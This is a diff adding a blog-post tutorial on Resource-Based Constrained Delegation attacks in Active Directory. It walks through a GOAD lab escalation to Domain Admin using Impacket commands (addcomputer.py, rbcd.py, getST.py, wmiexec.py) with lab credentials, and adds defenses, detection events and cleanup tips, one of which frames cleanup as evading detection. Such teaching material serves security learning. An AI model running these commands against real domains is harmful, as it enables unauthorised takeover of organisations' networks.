@@ -1,0 +1,312 @@
+---
+layout: post
+title: "Active Directory 101: RBCD (Resource-Based Constrained Delegation)"
+date: 2025-08-04 14:00:00 +0000
+categories: [active-directory, rbcd, privilege-escalation]
+tags: [rbcd, kerberos, delegation, s4u, privilege-escalation, bloodhound]
+description: "Master Resource-Based Constrained Delegation attacks - from BloodHound discovery to Domain Admin through Kerberos S4U protocol abuse"
+---
+
+# Active Directory 101: RBCD (Resource-Based Constrained Delegation)
+*Advanced Kerberos Delegation Attack*
+
+---
+
+## 🎯 What is RBCD?
+
+<div class="key-concept" markdown="1">
+**Resource-Based Constrained Delegation**
+
+- Allows a **service** to impersonate **any user** to access specific resources
+- Uses Kerberos **S4U2Self** and **S4U2Proxy** extensions
+- Configured via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
+</div>
+
+### RBCD Participants
+
+| Role | Description |
+|------|-------------|
+| **👤 USER** | Wants to access a service |
+| **🖥️ SERVICE A** | Intermediary service |
+| **🗄️ RESOURCE B** | Target resource |
+
+<div class="warning-box" markdown="1">
+⚠️ **Attack Vector:** If we can control Service A or modify the delegation settings, we can impersonate any user to access Resource B!
+</div>
+
+---
+
+## 🔄 How RBCD Works
+
+### Normal RBCD Flow
+
+1. **User sends TGS to Service A**
+2. **Service A requests TGS for Resource B (for User)**
+3. **Service A accesses Resource B as User**
+
+### BloodHound Detection
+
+<div class="bloodhound-note" markdown="1">
+**🩸 BloodHound Edge:** "GenericAll" on Computer Object
+</div>
+
+---
+
+## 📋 Attack Prerequisites
+
+### 🎯 What You Need
+
+<div class="prerequisite-box" markdown="1">
+**Two Attack Paths:**
+
+- **Option 1:** Control of a computer object listed in the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`
+- **Option 2 (Most Common):** Write permissions on the target computer's AD object
+</div>
+
+<div class="warning-box" markdown="1">
+💡 **Spoiler Alert:** Option 2 is VERY common! Many users have write permissions on computer objects they shouldn't have.
+</div>
+
+### BloodHound Query Example
+
+**Edge:** STANNIS.BARATHEON@SEVENKINGDOMS.LOCAL → KINGSLANDING.SEVENKINGDOMS.LOCAL  
+**Relationship:** GenericAll
+
+<div class="success-box" markdown="1">
+✅ **Real World:** Domain users often have excessive permissions on computer objects in their OU or department
+</div>
+
+---
+
+## ⚔️ RBCD Attack Steps
+
+### Six-Step Attack Process
+
+| Step | Action | Description |
+|------|--------|-------------|
+| **0** | **🖥️ Create Computer** | Add machine account to domain (default: 10 per user) |
+| **1** | **📝 Modify Attribute** | Add our computer to target's msDS-AllowedToActOnBehalfOfOtherIdentity |
+| **2** | **🎫 Request TGT** | Get TGT for our compromised computer |
+| **3** | **🎭 S4U2Self** | Request TGS for privileged user to our computer |
+| **4** | **🔄 S4U2Proxy** | Request TGS for privileged user to target computer |
+| **5** | **💥 Execute** | Use TGS for privilege escalation (e.g., SMBexec as Domain Admin) |
+
+<div class="warning-box" markdown="1">
+🎯 **End Goal:** Execute commands as Domain Administrator on the target system!
+</div>
+
+---
+
+## 🔐 Understanding S4U Protocol
+
+The technical foundation of RBCD attacks involves two Kerberos extensions:
+
+### S4U Protocol Components
+
+| Component | Description | Purpose |
+|-----------|-------------|---------|
+| **🎫 S4U2Self** | "Service for User to Self" | Service requests a TGS for any user to itself |
+| **🔄 S4U2Proxy** | "Service for User to Proxy" | Service uses previous TGS to request access to another service |
+| **💥 Result** | Complete User Impersonation | Service can now act as any user on target resource |
+
+### Technical Flow
+
+```bash
+# S4U2Self: "I need a ticket for Administrator to myself"
+KDC: "Here's a TGS for Administrator@domain → EVILCOMPUTER$"
+
+# S4U2Proxy: "I need a ticket for Administrator to target service"  
+KDC: "Here's a TGS for Administrator@domain → TARGET/cifs"
+
+# Result: We can now access TARGET as Administrator!
+```
+
+---
+
+## 🛠️ RBCD Attack Tools
+
+### Essential Tools by Category
+
+| Category | Tools | Purpose |
+|----------|-------|---------|
+| **🖥️ Computer Creation** | addcomputer.py, PowerMad, StandIn | Create controlled machine accounts |
+| **📝 Attribute Modification** | rbcd.py, PowerView, StandIn | Configure delegation attributes |
+| **🎫 Kerberos Operations** | getST.py, Rubeus | Execute S4U protocol |
+| **💥 Execution** | wmiexec.py, smbexec.py, psexec.py | Execute commands with tickets |
+
+---
+
+## 🧪 Lab Demo - GOAD Attack
+
+### Attack Parameters
+
+<div class="prerequisite-box" markdown="1">
+**Attack Scenario:**
+- **Attacker:** stannis.baratheon@sevenkingdoms.local
+- **Target DC:** kingslanding.sevenkingdoms.local
+- **Target Server:** kingslanding.sevenkingdoms.local
+- **Credentials:** stannis.baratheon / Drag0nst0ne
+</div>
+
+<div class="warning-box" markdown="1">
+🔥 **Scenario:** Stannis has GenericAll permissions on the KINGSLANDING computer object and wants to become Domain Admin
+</div>
+
+---
+
+## ⚔️ RBCD Attack Execution
+
+### Step 0: Create Machine Account
+
+```bash
+# Step 0: Create a machine account (optional - we can create 10 by default)
+proxychains addcomputer.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
+    -method LDAPS -computer-name EVILCOMPUTER$ -computer-pass EvilPass123!
+```
+
+<div class="success-box" markdown="1">
+✅ **Result:** We now have a controlled computer account: EVILCOMPUTER$
+</div>
+
+### Step 1: Configure Delegation
+
+```bash
+# Add our computer to target's delegation attribute
+proxychains rbcd.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
+    -delegate-from EVILCOMPUTER$ -delegate-to KINGSLANDING$ -action write
+```
+
+### Step 2: S4U Attack
+
+```bash
+# Perform complete S4U2Self + S4U2Proxy attack
+proxychains getST.py sevenkingdoms.local/EVILCOMPUTER$:EvilPass123! \
+    -spn cifs/kingslanding.sevenkingdoms.local \
+    -impersonate Administrator -dc-ip kingslanding.sevenkingdoms.local
+```
+
+### Step 3: Use the Ticket
+
+```bash
+# Export the ticket and use it for execution
+export KRB5CCNAME=Administrator.ccache
+proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local \
+    -k -no-pass
+```
+
+<div class="success-box" markdown="1">
+🎉 **Success!** We now have Domain Administrator access to the target system!
+</div>
+
+---
+
+## 🎓 Advanced RBCD Techniques
+
+### Advanced Strategies
+
+| Strategy | Focus Areas | Tools/Methods |
+|----------|-------------|---------------|
+| **🎯 Target Selection** | Domain Controllers, High-value servers, Certificate Authorities | BloodHound analysis |
+| **🔍 Permission Discovery** | GenericAll edges, PowerView queries, Manual LDAP | BloodHound, PowerView |
+| **🎭 Impersonation Targets** | Domain/Enterprise Admins, Service accounts | Privilege analysis |
+| **🧹 Cleanup** | Remove delegation, Delete computers, Clear tickets | rbcd.py -remove |
+
+<div class="warning-box" markdown="1">
+🧹 **Always Clean Up!** Remove delegation settings and created computer accounts after testing
+</div>
+
+---
+
+## 🛡️ RBCD Defense Strategies
+
+### Defense Categories
+
+| Defense Type | Actions | Monitoring |
+|--------------|---------|------------|
+| **🔒 Permission Hardening** | Audit GenericAll permissions, Implement least privilege, Regular reviews | BloodHound queries |
+| **📊 Monitoring** | msDS-AllowedToActOnBehalfOfOtherIdentity changes, Machine account creation alerts | Event logs |
+| **🎛️ Configuration** | Reduce machine account quota, Protected Users group, Tier 0 architecture | Group Policy |
+| **🔍 Detection** | Event ID 4742/4738, Unusual S4U TGS requests | SIEM alerts |
+
+<div class="success-box" markdown="1">
+✅ **Key Defense:** Regularly audit and restrict write permissions on computer objects
+</div>
+
+---
+
+## 🎯 RBCD Key Takeaways
+
+<div class="takeaway-box" markdown="1">
+✅ **RBCD is powerful:** Can lead to Domain Admin from limited permissions
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Common misconfiguration:** Excessive write permissions on computer objects
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Kerberos abuse:** S4U2Self + S4U2Proxy = user impersonation
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **BloodHound:** Essential for finding GenericAll edges
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Essential Tools:** Impacket suite (rbcd.py, getST.py, addcomputer.py)
+</div>
+
+<div class="takeaway-box" markdown="1">
+✅ **Impact:** Domain Administrator access from write permissions
+</div>
+
+---
+
+## Complete RBCD Attack Chain
+
+```bash
+# Complete RBCD Attack Chain
+1. addcomputer.py    # Create controlled computer
+2. rbcd.py           # Configure delegation  
+3. getST.py          # S4U2Self + S4U2Proxy
+4. wmiexec.py        # Execute as Domain Admin
+5. rbcd.py -remove   # Clean up (IMPORTANT!)
+```
+
+<div class="warning-box" markdown="1">
+**🚨 RBCD is one of the most effective AD privilege escalation techniques! 🚨**
+
+Always check computer object permissions during assessments
+</div>
+
+---
+
+## 💡 Pro Tips
+
+- **Use BloodHound extensively** - GenericAll edges are common and often overlooked
+- **Target high-value systems** - Domain Controllers and critical servers first
+- **Always clean up** - Remove delegation settings to avoid detection
+- **Combine with other techniques** - RBCD works well with Kerberoasting and ASREPRoasting
+- **Test machine account quotas** - Default is 10 per user, but may be restricted
+
+---
+
+## Real-World Impact
+
+RBCD attacks are particularly effective because:
+
+1. **Common Misconfigurations** - Many environments have excessive computer object permissions
+2. **Kerberos Legitimacy** - S4U requests appear as normal Kerberos activity
+3. **High Impact** - Direct path to Domain Admin from limited privileges
+4. **Difficult Detection** - Legitimate delegation mechanisms make detection challenging
+
+---
+
+*This post is part of the Active Directory 101 series. RBCD represents one of the most sophisticated yet practical privilege escalation techniques in modern AD environments.*
+
+## References
+
+- [Impacket Tools Suite](https://github.com/fortra/impacket)
+- [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound)
+- [Microsoft S4U Documentation](https://docs.microsoft.com/en-us/windows/win32/secauthn/service-for-user-authentication)
+- [RBCD Attack Research](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
